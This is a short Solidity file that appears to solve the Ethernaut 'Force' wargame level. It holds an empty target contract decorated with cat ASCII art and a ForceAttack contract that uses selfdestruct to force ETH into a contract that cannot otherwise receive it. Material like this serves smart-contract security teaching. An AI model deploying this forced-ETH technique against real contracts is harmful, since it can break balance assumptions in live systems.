// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

// solhint-disable no-empty-blocks
contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract ForceAttack {
    function execute(address payable target) external payable {
        require(target != address(0), "bad target");
        require(msg.value > 0, "need eth");
        selfdestruct(target);
    }
}
